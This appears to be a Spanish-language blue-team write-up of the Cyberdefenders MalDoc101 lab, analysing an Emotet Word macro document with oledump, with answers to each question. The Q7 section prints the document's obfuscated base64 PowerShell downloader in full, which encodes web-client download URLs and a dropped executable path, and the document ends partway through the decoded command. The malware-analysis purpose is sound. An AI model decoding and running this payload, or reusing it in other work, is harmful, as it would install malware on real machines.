+++
title = "MalDoc101 - Cyberdefenders (Medium)"
+++


[link del laboratorio maldoc101](https://cyberdefenders.org/blueteam-ctf-challenges/maldoc101/)

## Descargar laboratorio y moverlo a la máquina virtual REMnux

### unzip lab

```bash
7z x 51-maldoc101.zip -pcyberdefenders.org
```

## Preguntas

### Q1

Multiple streams contain macros in this document. Provide the number of highest one.

Este documento contiene varias macros. Indique el número de la más alta.

```bash
oledump.py sample.bin 
```

```bash
 1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7119 '1Table'
  5:    101483 'Data'
  6:       581 'Macros/PROJECT'
  7:       119 'Macros/PROJECTwm'
  8:     12997 'Macros/VBA/_VBA_PROJECT'
  9:      2112 'Macros/VBA/__SRP_0'
 10:       190 'Macros/VBA/__SRP_1'
 11:       532 'Macros/VBA/__SRP_2'
 12:       156 'Macros/VBA/__SRP_3'
 13: M    1367 'Macros/VBA/diakzouxchouz'
 14:       908 'Macros/VBA/dir'
 15: M    5705 'Macros/VBA/govwiahtoozfaid'
 16: m    1187 'Macros/VBA/roubhaol'
 17:        97 'Macros/roubhaol/\x01CompObj'
 18:       292 'Macros/roubhaol/\x03VBFrame'
 19:       510 'Macros/roubhaol/f'
 20:       112 'Macros/roubhaol/i05/\x01CompObj'
 21:        44 'Macros/roubhaol/i05/f'
 22:         0 'Macros/roubhaol/i05/o'
 23:       112 'Macros/roubhaol/i07/\x01CompObj'
 24:        44 'Macros/roubhaol/i07/f'
 25:         0 'Macros/roubhaol/i07/o'
 26:       115 'Macros/roubhaol/i09/\x01CompObj'
 27:       176 'Macros/roubhaol/i09/f'
 28:       110 'Macros/roubhaol/i09/i11/\x01CompObj'
 29:        40 'Macros/roubhaol/i09/i11/f'
 30:         0 'Macros/roubhaol/i09/i11/o'
 31:       110 'Macros/roubhaol/i09/i12/\x01CompObj'
 32:        40 'Macros/roubhaol/i09/i12/f'
 33:         0 'Macros/roubhaol/i09/i12/o'
 34:     15164 'Macros/roubhaol/i09/o'
 35:        48 'Macros/roubhaol/i09/x'
 36:       444 'Macros/roubhaol/o'
 37:      4096 'WordDocument'
```

> La diferencia entre "M" y "m" en las macros oledump está relacionada con el tipo de macro que contiene el archivo OLE.

>Si el código de la macro VBA sólo se compone de sentencias Attribute u Option, y ninguna otra sentencia, entonces el indicador es una letra "m" minúscula. Este es el caso de las macros que son esencialmente sólo metadatos y no contienen ningún código ejecutable.

>Por otro lado, si el código de la macro VBA contiene código ejecutable, el indicador es una "M" mayúscula. Este tipo de macro puede potencialmente ejecutar código y se considera maliciosa.

>En el script oledump.py, la opción -m se utiliza para indicar si el código de la macro está compuesto únicamente por sentencias Attribute u Option. Si no se especifica -m, oledump asumirá por defecto que el código de la macro contiene código ejecutable y utilizará la "M" mayúscula como indicador.


#### Respuesta

`16`

### Q2

What event is used to begin the execution of the macros?

¿Qué evento se utiliza para iniciar la ejecución de las macros?

```bash
oledump.py -s 13 -v sample.bin > s13
```

```bash
remnux@remnux:~/Documents/labs/MalDoc101$ cat s13 
Attribute VB_Name = "diakzouxchouz"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub _
Document_open()
boaxvoebxiotqueb
End Sub
```

#### Respuesta

`Document_open`

## Q3 

What malware family was this maldoc attempting to drop?

¿Qué familia de malware intentaba lanzar este maldoc?

```bash
remnux@remnux:~/Documents/labs/MalDoc101$ sha256sum sample.bin 
d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee  sample.bin
```

![virus total results](/images/labs/cyberdefenders/maldoc101/maldoc101_virustotal.png)


#### Respuesta

`emotet`

## Q4

What stream is responsible for the storage of the base64-encoded string?

¿Qué stream es responsable del almacenamiento de la cadena codificada en base64?


```bash
remnux@remnux:~/Documents/labs/MalDoc101$ oledump.py -s 34 -d sample.bin 
```

#### Respuesta

`34`

## Q5

This document contains a user-form. Provide the name?

Este documento contiene un formulario de usuario. Indicar el nombre.

```bash
remnux@remnux:~/Documents/labs/MalDoc101$ oledump.py -s 16 -v sample.bin > s16


remnux@remnux:~/Documents/labs/MalDoc101$ cat s16
Attribute VB_Name = "roubhaol"
Attribute VB_Base = "0{F7B023C4-B78E-4209-9503-5004D43255AC}{575DE6EB-8D5E-4153-8C58-4FAD3CE32577}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
```

#### Respuesta

`roubhaol`

## Q6

This document contains an obfuscated base64 encoded string; what value is used to pad (or obfuscate) this string?

Este documento contiene una cadena codificada en base64 ofuscada; ¿qué valor se utiliza para rellenar (u ofuscar) esta cadena?


```bash
remnux@remnux:~/Documents/labs/MalDoc101$ cp s15 macro_s15.vbs

****
ANALIZAR EN EDITOR DE TEXTO
****
remnux@remnux:~/Documents/labs/MalDoc101$ subl macro_s15.vbs
```

#### Respuesta

`2342772g3&*gs7712ffvs626fq`

## Q7

What is the program executed by the base64 encoded string?

¿Cuál es el programa ejecutado por la cadena codificada en base64?


```py
split_string = "2342772g3&*gs7712ffvs626fq"

base64_string_separated = """;1�����Page1O3G�Page2O3G�:�p2342772g3&*gs7712ffvs626fqo2342772g3&*gs7712ffvs626fqw2342772g3&*gs7712ffvs626fqe2342772g3&*gs7712ffvs626fqr2342772g3&*gs7712ffvs626fqs2342772g3&*gs7712ffvs626fqh2342772g3&*gs7712ffvs626fqeL2342772g3&*gs7712ffvs626fqL2342772g3&*gs7712ffvs626fq 2342772g3&*gs7712ffvs626fq-2342772g3&*gs7712ffvs626fqe2342772g3&*gs7712ffvs626fq JABsAG2342772g3&*gs7712ffvs626fqkAZQBj2342772g3&*gs7712ffvs626fqAGgAcg2342772g3&*gs7712ffvs626fqBvAHUA2342772g3&*gs7712ffvs626fqaAB3AH2342772g3&*gs7712ffvs626fqUAdwA92342772g3&*gs7712ffvs626fqACcAdg2342772g3&*gs7712ffvs626fqB1AGEA2342772g3&*gs7712ffvs626fqYwBkAG2342772g3&*gs7712ffvs626fq8AdQB22342772g3&*gs7712ffvs626fqAGMAaQ2342772g3&*gs7712ffvs626fqBvAHgA2342772g3&*gs7712ffvs626fqaABhAG2342772g3&*gs7712ffvs626fq8AbAAn2342772g3&*gs7712ffvs626fqADsAWw2342772g3&*gs7712ffvs626fqBOAGUA2342772g3&*gs7712ffvs626fqdAAuAF2342772g3&*gs7712ffvs626fqMAZQBy2342772g3&*gs7712ffvs626fqAHYAaQ2342772g3&*gs7712ffvs626fqBjAGUA2342772g3&*gs7712ffvs626fqUABvAG2342772g3&*gs7712ffvs626fqkAbgB02342772g3&*gs7712ffvs626fqAE0AYQ2342772g3&*gs7712ffvs626fqBuAGEA2342772g3&*gs7712ffvs626fqZwBlAH2342772g3&*gs7712ffvs626fqIAXQA62342772g3&*gs7712ffvs626fqADoAIg2342772g3&*gs7712ffvs626fqBTAEUA2342772g3&*gs7712ffvs626fqYABjAH2342772g3&*gs7712ffvs626fqUAUgBp2342772g3&*gs7712ffvs626fqAFQAeQ2342772g3&*gs7712ffvs626fqBgAFAA2342772g3&*gs7712ffvs626fqUgBPAG2342772g3&*gs7712ffvs626fqAAVABv2342772g3&*gs7712ffvs626fqAEMAYA2342772g3&*gs7712ffvs626fqBvAGwA2342772g3&*gs7712ffvs626fqIgAgAD2342772g3&*gs7712ffvs626fq0AIAAn2342772g3&*gs7712ffvs626fqAHQAbA2342772g3&*gs7712ffvs626fqBzADEA2342772g3&*gs7712ffvs626fqMgAsAC2342772g3&*gs7712ffvs626fqAAdABs2342772g3&*gs7712ffvs626fqAHMAMQ2342772g3&*gs7712ffvs626fqAxACwA2342772g3&*gs7712ffvs626fqIAB0AG2342772g3&*gs7712ffvs626fqwAcwAn2342772g3&*gs7712ffvs626fqADsAJA2342772g3&*gs7712ffvs626fqBkAGUA2342772g3&*gs7712ffvs626fqaQBjAG2342772g3&*gs7712ffvs626fqgAYgBl2342772g3&*gs7712ffvs626fqAHUAZA2342772g3&*gs7712ffvs626fqByAGUA2342772g3&*gs7712ffvs626fqaQByAC2342772g3&*gs7712ffvs626fqAAPQAg2342772g3&*gs7712ffvs626fqACcAMw2342772g3&*gs7712ffvs626fqAzADcA2342772g3&*gs7712ffvs626fqJwA7AC2342772g3&*gs7712ffvs626fqQAcQB12342772g3&*gs7712ffvs626fqAG8AYQ2342772g3&*gs7712ffvs626fqBkAGcA2342772g3&*gs7712ffvs626fqbwBpAG2342772g3&*gs7712ffvs626fqoAdgBl2342772g3&*gs7712ffvs626fqAHUAbQ2342772g3&*gs7712ffvs626fqA9ACcA2342772g3&*gs7712ffvs626fqZAB1AH2342772g3&*gs7712ffvs626fqUAdgBt2342772g3&*gs7712ffvs626fqAG8AZQ2342772g3&*gs7712ffvs626fqB6AGgA2342772g3&*gs7712ffvs626fqYQBpAH2342772g3&*gs7712ffvs626fqQAZwBv2342772g3&*gs7712ffvs626fqAGgAJw2342772g3&*gs7712ffvs626fqA7ACQA2342772g3&*gs7712ffvs626fqdABvAG2342772g3&*gs7712ffvs626fqUAaABm2342772g3&*gs7712ffvs626fqAGUAdA2342772g3&*gs7712ffvs626fqBoAHgA2342772g3&*gs7712ffvs626fqbwBoAG2342772g3&*gs7712ffvs626fqIAYQBl2342772g3&*gs7712ffvs626fqAHkAPQ2342772g3&*gs7712ffvs626fqAkAGUA2342772g3&*gs7712ffvs626fqbgB2AD2342772g3&*gs7712ffvs626fqoAdQBz2342772g3&*gs7712ffvs626fqAGUAcg2342772g3&*gs7712ffvs626fqBwAHIA2342772g3&*gs7712ffvs626fqbwBmAG2342772g3&*gs7712ffvs626fqkAbABl2342772g3&*gs7712ffvs626fqACsAJw2342772g3&*gs7712ffvs626fqBcACcA2342772g3&*gs7712ffvs626fqKwAkAG2342772g3&*gs7712ffvs626fqQAZQBp2342772g3&*gs7712ffvs626fqAGMAaA2342772g3&*gs7712ffvs626fqBiAGUA2342772g3&*gs7712ffvs626fqdQBkAH2342772g3&*gs7712ffvs626fqIAZQBp2342772g3&*gs7712ffvs626fqAHIAKw2342772g3&*gs7712ffvs626fqAnAC4A2342772g3&*gs7712ffvs626fqZQB4AG2342772g3&*gs7712ffvs626fqUAJwA72342772g3&*gs7712ffvs626fqACQAcw2342772g3&*gs7712ffvs626fqBpAGUA2342772g3&*gs7712ffvs626fqbgB0AG2342772g3&*gs7712ffvs626fqUAZQBk2342772g3&*gs7712ffvs626fqAD0AJw2342772g3&*gs7712ffvs626fqBxAHUA2342772g3&*gs7712ffvs626fqYQBpAG2342772g3&*gs7712ffvs626fq4AcQB12342772g3&*gs7712ffvs626fqAGEAYw2342772g3&*gs7712ffvs626fqBoAGwA2342772g3&*gs7712ffvs626fqbwBhAH2342772g3&*gs7712ffvs626fqoAJwA72342772g3&*gs7712ffvs626fqACQAcg2342772g3&*gs7712ffvs626fqBlAHUA2342772g3&*gs7712ffvs626fqcwB0AG2342772g3&*gs7712ffvs626fqgAbwBh2342772g3&*gs7712ffvs626fqAHMAPQ2342772g3&*gs7712ffvs626fqAuACgA2342772g3&*gs7712ffvs626fqJwBuAC2342772g3&*gs7712ffvs626fqcAKwAn2342772g3&*gs7712ffvs626fqAGUAdw2342772g3&*gs7712ffvs626fqAtAG8A2342772g3&*gs7712ffvs626fqYgAnAC2342772g3&*gs7712ffvs626fqsAJwBq2342772g3&*gs7712ffvs626fqAGUAYw2342772g3&*gs7712ffvs626fqB0ACcA2342772g3&*gs7712ffvs626fqKQAgAG2342772g3&*gs7712ffvs626fq4ARQB02342772g3&*gs7712ffvs626fqAC4Adw2342772g3&*gs7712ffvs626fqBlAEIA2342772g3&*gs7712ffvs626fqYwBsAE2342772g3&*gs7712ffvs626fqkAZQBu2342772g3&*gs7712ffvs626fqAFQAOw2342772g3&*gs7712ffvs626fqAkAGoA2342772g3&*gs7712ffvs626fqYQBjAG2342772g3&*gs7712ffvs626fqwAZQBl2342772g3&*gs7712ffvs626fqAHcAeQ2342772g3&*gs7712ffvs626fqBpAHEA2342772g3&*gs7712ffvs626fqdQA9AC2342772g3&*gs7712ffvs626fqcAaAB02342772g3&*gs7712ffvs626fqAHQAcA2342772g3&*gs7712ffvs626fqBzADoA2342772g3&*gs7712ffvs626fqLwAvAG2342772g3&*gs7712ffvs626fqgAYQBv2342772g3&*gs7712ffvs626fqAHEAdQ2342772g3&*gs7712ffvs626fqBuAGsA2342772g3&*gs7712ffvs626fqbwBuAG2342772g3&*gs7712ffvs626fqcALgBj2342772g3&*gs7712ffvs626fqAG8AbQ2342772g3&*gs7712ffvs626fqAvAGIA2342772g3&*gs7712ffvs626fqbgAvAH2342772g3&*gs7712ffvs626fqMAOQB32342772g3&*gs7712ffvs626fqADQAdA2342772g3&*gs7712ffvs626fqBnAGMA2342772g3&*gs7712ffvs626fqagBsAF2342772g3&*gs7712ffvs626fq8AZgA22342772g3&*gs7712ffvs626fqADYANg2342772g3&*gs7712ffvs626fqA5AHUA2342772g3&*gs7712ffvs626fqZwB1AF2342772g3&*gs7712ffvs626fq8AdwA02342772g3&*gs7712ffvs626fqAGIAag2342772g3&*gs7712ffvs626fqAvACoA2342772g3&*gs7712ffvs626fqaAB0AH2342772g3&*gs7712ffvs626fqQAcABz2342772g3&*gs7712ffvs626fqADoALw2342772g3&*gs7712ffvs626fqAvAHcA2342772g3&*gs7712ffvs626fqdwB3AC2342772g3&*gs7712ffvs626fq4AdABl2342772g3&*gs7712ffvs626fqAGMAaA2342772g3&*gs7712ffvs626fqB0AHIA2342772g3&*gs7712ffvs626fqYQB2AG2342772g3&*gs7712ffvs626fqUAbAAu2342772g3&*gs7712ffvs626fqAGUAdg2342772g3&*gs7712ffvs626fqBlAG4A2342772g3&*gs7712ffvs626fqdABzAC2342772g3&*gs7712ffvs626fq8AaQBu2342772g3&*gs7712ffvs626fqAGYAbw2342772g3&*gs7712ffvs626fqByAG0A2342772g3&*gs7712ffvs626fqYQB0AG2342772g3&*gs7712ffvs626fqkAbwBu2342772g3&*gs7712ffvs626fqAGwALw2342772g3&*gs7712ffvs626fqA4AGwA2342772g3&*gs7712ffvs626fqcwBqAG2342772g3&*gs7712ffvs626fqgAcgBs2342772g3&*gs7712ffvs626fqADYAbg2342772g3&*gs7712ffvs626fqBuAGsA2342772g3&*gs7712ffvs626fqdwBnAH2342772g3&*gs7712ffvs626fqkAegBz2342772g3&*gs7712ffvs626fqAHUAZA2342772g3&*gs7712ffvs626fqB6AGEA2342772g3&*gs7712ffvs626fqbQBfAG2342772g3&*gs7712ffvs626fqgAMwB32342772g3&*gs7712ffvs626fqAG4AZw2342772g3&*gs7712ffvs626fqBfAGEA2342772g3&*gs7712ffvs626fqNgB2AD2342772g3&*gs7712ffvs626fqUALwAq2342772g3&*gs7712ffvs626fqAGgAdA2342772g3&*gs7712ffvs626fqB0AHAA2342772g3&*gs7712ffvs626fqOgAvAC2342772g3&*gs7712ffvs626fq8AZABp2342772g3&*gs7712ffvs626fqAGcAaQ2342772g3&*gs7712ffvs626fqB3AGUA2342772g3&*gs7712ffvs626fqYgBtAG2342772g3&*gs7712ffvs626fqEAcgBr2342772g3&*gs7712ffvs626fqAGUAdA2342772g3&*gs7712ffvs626fqBpAG4A2342772g3&*gs7712ffvs626fqZwAuAG2342772g3&*gs7712ffvs626fqMAbwBt2342772g3&*gs7712ffvs626fqAC8Adw2342772g3&*gs7712ffvs626fqBwAC0A2342772g3&*gs7712ffvs626fqYQBkAG2342772g3&*gs7712ffvs626fq0AaQBu2342772g3&*gs7712ffvs626fqAC8ANw2342772g3&*gs7712ffvs626fqAyAHQA2342772g3&*gs7712ffvs626fqMABqAG2342772g3&*gs7712ffvs626fqoAaABt2342772g3&*gs7712ffvs626fqAHYANw2342772g3&*gs7712ffvs626fqB0AGEA2342772g3&*gs7712ffvs626fqawB3AH2342772g3&*gs7712ffvs626fqYAaQBz2342772g3&*gs7712ffvs626fqAGYAbg2342772g3&*gs7712ffvs626fqB6AF8A2342772g3&*gs7712ffvs626fqZQBlAG2342772g3&*gs7712ffvs626fqoAdgBm2342772g3&*gs7712ffvs626fqAF8AaA2342772g3&*gs7712ffvs626fqA2AHYA2342772g3&*gs7712ffvs626fqMgBpAH2342772g3&*gs7712ffvs626fqgALwAq2342772g3&*gs7712ffvs626fqAGgAdA2342772g3&*gs7712ffvs626fqB0AHAA2342772g3&*gs7712ffvs626fqOgAvAC2342772g3&*gs7712ffvs626fq8AaABv2342772g3&*gs7712ffvs626fqAGwAZg2342772g3&*gs7712ffvs626fqB2AGUA2342772g3&*gs7712ffvs626fqLgBzAG2342772g3&*gs7712ffvs626fqUALwBp2342772g3&*gs7712ffvs626fqAG0AYQ2342772g3&*gs7712ffvs626fqBnAGUA2342772g3&*gs7712ffvs626fqcwAvAD2342772g3&*gs7712ffvs626fqEAYwBr2342772g3&*gs7712ffvs626fqAHcANQ2342772g3&*gs7712ffvs626fqBtAGoA2342772g3&*gs7712ffvs626fqNAA5AH2342772g3&*gs7712ffvs626fqcAXwAy2342772g3&*gs7712ffvs626fqAGsAMQ2342772g3&*gs7712ffvs626fqAxAHAA2342772g3&*gs7712ffvs626fqeABfAG2342772g3&*gs7712ffvs626fqQALwAq2342772g3&*gs7712ffvs626fqAGgAdA2342772g3&*gs7712ffvs626fqB0AHAA2342772g3&*gs7712ffvs626fqOgAvAC2342772g3&*gs7712ffvs626fq8AdwB32342772g3&*gs7712ffvs626fqAHcALg2342772g3&*gs7712ffvs626fqBjAGYA2342772g3&*gs7712ffvs626fqbQAuAG2342772g3&*gs7712ffvs626fq4AbAAv2342772g3&*gs7712ffvs626fqAF8AYg2342772g3&*gs7712ffvs626fqBhAGMA2342772g3&*gs7712ffvs626fqawB1AH2342772g3&*gs7712ffvs626fqAALwB52342772g3&*gs7712ffvs626fqAGYAaA2342772g3&*gs7712ffvs626fqByAG0A2342772g3&*gs7712ffvs626fqaAA2AH2342772g3&*gs7712ffvs626fqUAMABo2342772g3&*gs7712ffvs626fqAGUAaQ2342772g3&*gs7712ffvs626fqBkAG4A2342772g3&*gs7712ffvs626fqdwByAH2342772g3&*gs7712ffvs626fqUAdwBo2342772g3&*gs7712ffvs626fqAGEAMg2342772g3&*gs7712ffvs626fqB0ADQA2342772g3&*gs7712ffvs626fqbQBqAH2342772g3&*gs7712ffvs626fqoANgBw2342772g3&*gs7712ffvs626fqAF8AeQ2342772g3&*gs7712ffvs626fqB4AGgA2342772g3&*gs7712ffvs626fqeQB1AD2342772g3&*gs7712ffvs626fqMAOQAw2342772g3&*gs7712ffvs626fqAGkANg2342772g3&*gs7712ffvs626fqBfAHEA2342772g3&*gs7712ffvs626fqOQAzAG2342772g3&*gs7712ffvs626fqgAawBo2342772g3&*gs7712ffvs626fqADMAZA2342772g3&*gs7712ffvs626fqBkAG0A2342772g3&*gs7712ffvs626fqLwAnAC2342772g3&*gs7712ffvs626fq4AIgBz2342772g3&*gs7712ffvs626fqAGAAUA2342772g3&*gs7712ffvs626fqBsAGkA2342772g3&*gs7712ffvs626fqVAAiAC2342772g3&*gs7712ffvs626fqgAWwBj2342772g3&*gs7712ffvs626fqAGgAYQ2342772g3&*gs7712ffvs626fqByAF0A2342772g3&*gs7712ffvs626fqNAAyAC2342772g3&*gs7712ffvs626fqkAOwAk2342772g3&*gs7712ffvs626fqAHMAZQ2342772g3&*gs7712ffvs626fqBjAGMA2342772g3&*gs7712ffvs626fqaQBlAH2342772g3&*gs7712ffvs626fqIAZABl2342772g3&*gs7712ffvs626fqAGUAdA2342772g3&*gs7712ffvs626fqBoAD0A2342772g3&*gs7712ffvs626fqJwBkAH2342772g3&*gs7712ffvs626fqUAdQB62342772g3&*gs7712ffvs626fqAHkAZQ2342772g3&*gs7712ffvs626fqBhAHcA2342772g3&*gs7712ffvs626fqcAB1AG2342772g3&*gs7712ffvs626fqEAcQB12342772g3&*gs7712ffvs626fqACcAOw2342772g3&*gs7712ffvs626fqBmAG8A2342772g3&*gs7712ffvs626fqcgBlAG2342772g3&*gs7712ffvs626fqEAYwBo2342772g3&*gs7712ffvs626fqACgAJA2342772g3&*gs7712ffvs626fqBnAGUA2342772g3&*gs7712ffvs626fqZQByAH2342772g3&*gs7712ffvs626fqMAaQBl2342772g3&*gs7712ffvs626fqAGIAIA2342772g3&*gs7712ffvs626fqBpAG4A2342772g3&*gs7712ffvs626fqIAAkAG2342772g3&*gs7712ffvs626fqoAYQBj2342772g3&*gs7712ffvs626fqAGwAZQ2342772g3&*gs7712ffvs626fqBlAHcA2342772g3&*gs7712ffvs626fqeQBpAH2342772g3&*gs7712ffvs626fqEAdQAp2342772g3&*gs7712ffvs626fqAHsAdA2342772g3&*gs7712ffvs626fqByAHkA2342772g3&*gs7712ffvs626fqewAkAH2342772g3&*gs7712ffvs626fqIAZQB12342772g3&*gs7712ffvs626fqAHMAdA2342772g3&*gs7712ffvs626fqBoAG8A2342772g3&*gs7712ffvs626fqYQBzAC2342772g3&*gs7712ffvs626fq4AIgBk2342772g3&*gs7712ffvs626fqAE8AVw2342772g3&*gs7712ffvs626fqBOAGAA2342772g3&*gs7712ffvs626fqbABvAE2342772g3&*gs7712ffvs626fqEAYABk2342772g3&*gs7712ffvs626fqAGYAaQ2342772g3&*gs7712ffvs626fqBgAEwA2342772g3&*gs7712ffvs626fqZQAiAC2342772g3&*gs7712ffvs626fqgAJABn2342772g3&*gs7712ffvs626fqAGUAZQ2342772g3&*gs7712ffvs626fqByAHMA2342772g3&*gs7712ffvs626fqaQBlAG2342772g3&*gs7712ffvs626fqIALAAg2342772g3&*gs7712ffvs626fqACQAdA2342772g3&*gs7712ffvs626fqBvAGUA2342772g3&*gs7712ffvs626fqaABmAG2342772g3&*gs7712ffvs626fqUAdABo2342772g3&*gs7712ffvs626fqAHgAbw2342772g3&*gs7712ffvs626fqBoAGIA2342772g3&*gs7712ffvs626fqYQBlAH2342772g3&*gs7712ffvs626fqkAKQA72342772g3&*gs7712ffvs626fqACQAYg2342772g3&*gs7712ffvs626fqB1AGgA2342772g3&*gs7712ffvs626fqeABlAH2342772g3&*gs7712ffvs626fqUAaAA92342772g3&*gs7712ffvs626fqACcAZA2342772g3&*gs7712ffvs626fqBvAGUA2342772g3&*gs7712ffvs626fqeQBkAG2342772g3&*gs7712ffvs626fqUAaQBk2342772g3&*gs7712ffvs626fqAHEAdQ2342772g3&*gs7712ffvs626fqBhAGkA2342772g3&*gs7712ffvs626fqagBsAG2342772g3&*gs7712ffvs626fqUAdQBj2342772g3&*gs7712ffvs626fqACcAOw2342772g3&*gs7712ffvs626fqBJAGYA2342772g3&*gs7712ffvs626fqIAAoAC2342772g3&*gs7712ffvs626fqgALgAo2342772g3&*gs7712ffvs626fqACcARw2342772g3&*gs7712ffvs626fqBlAHQA2342772g3&*gs7712ffvs626fqLQAnAC2342772g3&*gs7712ffvs626fqsAJwBJ2342772g3&*gs7712ffvs626fqAHQAZQ2342772g3&*gs7712ffvs626fqAnACsA2342772g3&*gs7712ffvs626fqJwBtAC2342772g3&*gs7712ffvs626fqcAKQAg2342772g3&*gs7712ffvs626fqACQAdA2342772g3&*gs7712ffvs626fqBvAGUA2342772g3&*gs7712ffvs626fqaABmAG2342772g3&*gs7712ffvs626fqUAdABo2342772g3&*gs7712ffvs626fqAHgAbw2342772g3&*gs7712ffvs626fqBoAGIA2342772g3&*gs7712ffvs626fqYQBlAH2342772g3&*gs7712ffvs626fqkAKQAu2342772g3&*gs7712ffvs626fqACIAbA2342772g3&*gs7712ffvs626fqBgAGUA2342772g3&*gs7712ffvs626fqTgBHAF2342772g3&*gs7712ffvs626fqQASAAi2342772g3&*gs7712ffvs626fqACAALQ2342772g3&*gs7712ffvs626fqBnAGUA2342772g3&*gs7712ffvs626fqIAAyAD2342772g3&*gs7712ffvs626fqQANwA12342772g3&*gs7712ffvs626fqADEAKQ2342772g3&*gs7712ffvs626fqAgAHsA2342772g3&*gs7712ffvs626fqKABbAH2342772g3&*gs7712ffvs626fqcAbQBp2342772g3&*gs7712ffvs626fqAGMAbA2342772g3&*gs7712ffvs626fqBhAHMA2342772g3&*gs7712ffvs626fqcwBdAC2342772g3&*gs7712ffvs626fqcAdwBp2342772g3&*gs7712ffvs626fqAG4AMw2342772g3&*gs7712ffvs626fqAyAF8A2342772g3&*gs7712ffvs626fqUAByAG2342772g3&*gs7712ffvs626fq8AYwBl2342772g3&*gs7712ffvs626fqAHMAcw2342772g3&*gs7712ffvs626fqAnACkA2342772g3&*gs7712ffvs626fqLgAiAE2342772g3&*gs7712ffvs626fqMAYABS2342772g3&*gs7712ffvs626fqAGUAYQ2342772g3&*gs7712ffvs626fqBUAGUA2342772g3&*gs7712ffvs626fqIgAoAC2342772g3&*gs7712ffvs626fqQAdABv2342772g3&*gs7712ffvs626fqAGUAaA2342772g3&*gs7712ffvs626fqBmAGUA2342772g3&*gs7712ffvs626fqdABoAH2342772g3&*gs7712ffvs626fqgAbwBo2342772g3&*gs7712ffvs626fqAGIAYQ2342772g3&*gs7712ffvs626fqBlAHkA2342772g3&*gs7712ffvs626fqKQA7AC2342772g3&*gs7712ffvs626fqQAcQB12342772g3&*gs7712ffvs626fqAG8Abw2342772g3&*gs7712ffvs626fqBkAHQA2342772g3&*gs7712ffvs626fqZQBlAG2342772g3&*gs7712ffvs626fqgAPQAn2342772g3&*gs7712ffvs626fqAGoAaQ2342772g3&*gs7712ffvs626fqBhAGYA2342772g3&*gs7712ffvs626fqcgB1AH2342772g3&*gs7712ffvs626fqUAegBs2342772g3&*gs7712ffvs626fqAGEAbw2342772g3&*gs7712ffvs626fqBsAHQA2342772g3&*gs7712ffvs626fqaABvAG2342772g3&*gs7712ffvs626fqkAYwAn2342772g3&*gs7712ffvs626fqADsAYg2342772g3&*gs7712ffvs626fqByAGUA2342772g3&*gs7712ffvs626fqYQBrAD2342772g3&*gs7712ffvs626fqsAJABj2342772g3&*gs7712ffvs626fqAGgAaQ2342772g3&*gs7712ffvs626fqBnAGMA2342772g3&*gs7712ffvs626fqaABpAG2342772g3&*gs7712ffvs626fqUAbgB02342772g3&*gs7712ffvs626fqAGUAaQ2342772g3&*gs7712ffvs626fqBxAHUA2342772g3&*gs7712ffvs626fqPQAnAH2342772g3&*gs7712ffvs626fqkAbwBv2342772g3&*gs7712ffvs626fqAHcAdg2342772g3&*gs7712ffvs626fqBlAGkA2342772g3&*gs7712ffvs626fqaABuAG2342772g3&*gs7712ffvs626fqkAZQBq2342772g3&*gs7712ffvs626fqACcAfQ2342772g3&*gs7712ffvs626fqB9AGMA2342772g3&*gs7712ffvs626fqYQB0AG2342772g3&*gs7712ffvs626fqMAaAB72342772g3&*gs7712ffvs626fqAH0AfQ2342772g3&*gs7712ffvs626fqAkAHQA2342772g3&*gs7712ffvs626fqbwBpAH2342772g3&*gs7712ffvs626fqoAbAB12342772g3&*gs7712ffvs626fqAHUAbA2342772g3&*gs7712ffvs626fqBmAGkA2342772g3&*gs7712ffvs626fqZQByAD2342772g3&*gs7712ffvs626fq0AJwBm2342772g3&*gs7712ffvs626fqAG8AcQ2342772g3&*gs7712ffvs626fqB1AGwA2342772g3&*gs7712ffvs626fqZQB2AG2342772g3&*gs7712ffvs626fqMAYQBv2342772g3&*gs7712ffvs626fqAGoAJw2342772g3&*gs7712ffvs626fqA=�Tab3�Tab45��Tahoma"""


base64_string_array = "".join(base64_string_separated).split(split_string)

base64_string = "".join(base64_string_array)

print(base64_string)
```

```bash
remnux@remnux:~/Documents/labs/MalDoc101$ python3 q7_script.py 
;1�����Page1O3G�Page2O3G�:�powersheLL -e JABsAGkAZQBjAGgAcgBvAHUAaAB3AHUAdwA9ACcAdgB1AGEAYwBkAG8AdQB2AGMAaQBvAHgAaABhAG8AbAAnADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBTAEUAYABjAHUAUgBpAFQAeQBgAFAAUgBPAGAAVABvAEMAYABvAGwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJABkAGUAaQBjAGgAYgBlAHUAZAByAGUAaQByACAAPQAgACcAMwAzADcAJwA7ACQAcQB1AG8AYQBkAGcAbwBpAGoAdgBlAHUAbQA9ACcAZAB1AHUAdgBtAG8AZQB6AGgAYQBpAHQAZwBvAGgAJwA7ACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAGQAZQBpAGMAaABiAGUAdQBkAHIAZQBpAHIAKwAnAC4AZQB4AGUAJwA7ACQAcwBpAGUAbgB0AGUAZQBkAD0AJwBxAHUAYQBpAG4AcQB1AGEAYwBoAGwAbwBhAHoAJwA7ACQAcgBlAHUAcwB0AGgAbwBhAHMAPQAuACgAJwBuACcAKwAnAGUAdwAtAG8AYgAnACsAJwBqAGUAYwB0ACcAKQAgAG4ARQB0AC4AdwBlAEIAYwBsAEkAZQBuAFQAOwAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQA9ACcAaAB0AHQAcABzADoALwAvAGgAYQBvAHEAdQBuAGsAbwBuAGcALgBjAG8AbQAvAGIAbgAvAHMAOQB3ADQAdABnAGMAagBsAF8AZgA2ADYANgA5AHUAZwB1AF8AdwA0AGIAagAvACoAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AdABlAGMAaAB0AHIAYQB2AGUAbAAuAGU